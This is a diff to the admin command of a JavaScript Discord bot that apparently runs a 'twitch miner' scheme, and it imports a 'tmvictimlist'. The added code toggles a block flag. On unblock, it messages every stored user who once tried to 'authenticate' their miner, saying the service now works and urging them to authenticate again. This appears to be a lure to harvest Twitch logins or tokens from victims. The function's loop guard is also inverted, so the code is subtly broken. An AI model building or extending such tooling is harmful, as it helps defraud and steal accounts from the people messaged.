@@ -1,6 +1,7 @@
 const config = require("../.cfg.json");
-var { tmmachines, tmvictimlist } = require('../exports.js');
+const { tmmachines, tmvictimlist } = require('../exports.js');
 const { EmbedBuilder } = require('discord.js');
+const fs = require('fs');
 
 module.exports = {
 	name: 'admin',
@@ -9,6 +10,22 @@ module.exports = {
 	showHelp: false,
 	execute(message, args) {
 		if (!args[0]) return message.reply("1: userid?");
+		if (args[0] === "block") {
+			if (fs.existsSync("../passblocked")) return message.reply("already blocked");
+			fs.writeFile('../passblocked', "blocked", function() {
+				console.info("Block enabled");
+			});
+		}
+		if (args[0] === "unblock") {
+			if (!fs.existsSync("../passblocked")) return message.reply("already unblocked");
+			fs.unlink('../passblocked', function () {
+				console.info("Block disabled");
+				const { passblock, client } = require('../exports.js');
+				passblock.find({ }, function (err, docs) {
+					return sendiary(client, docs, 0);
+				});
+			});
+		}
 		//	var rTMmachine = {
 		//		"tmowner": message.author.id,
 		//		"tmusername": arg0,
@@ -91,3 +108,13 @@ module.exports = {
 		}
 	},
 };
+
+function sendiary(client, docs, i) {
+	if (docs.length > i) return;
+	client.users.fetch(docs[i].who, false).then((user) => {
+		user.send('Hi, I remember you trying to authenticate your twitch miner a while ago. Back then it didn\'t work, but I can proudly say that it should work now!\nOnce you authenticate, your miner will be up and running. Have fun!');
+	});
+	setTimeout(() => {
+		return sendiary(client, docs, (i + 1));
+	}, 5000);
+}
